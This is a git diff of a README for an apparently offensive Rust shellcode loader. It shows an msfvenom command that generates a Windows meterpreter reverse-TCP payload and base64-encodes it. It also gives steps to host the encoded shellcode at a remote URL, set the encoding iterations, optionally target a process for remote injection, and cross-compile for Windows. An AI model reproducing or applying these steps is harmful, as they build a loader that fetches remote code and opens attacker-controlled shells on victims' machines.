@@ -30,7 +30,7 @@ If you don't want to use the script, you can also encode raw shellcode from `msf
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw | base64 -w 0 > note.txt
 # Pipe to base64 -w 0 as many times as you want to iterate the encoding
 ```
-3. Edit the source code in `src/main.rs` to reflect the `URL` where the encoded shellcode will be hosted.
+3. Edit the source code in `src/main.rs` to reflect the `URL` where the encoded shellcode will be hosted. Make sure `B64_TTERATIONS` matches what you created with `encode.py`. If you wish to use remote injection, change the `PROCESS_NAME` value as well.
 
 4. Run `cargo build --target x86_64-pc-windows-gnu --release`. If building on Linux for Windows, make sure you've added the Windows target triple with `rustup target add x86_64-pc-windows-gnu`.
 
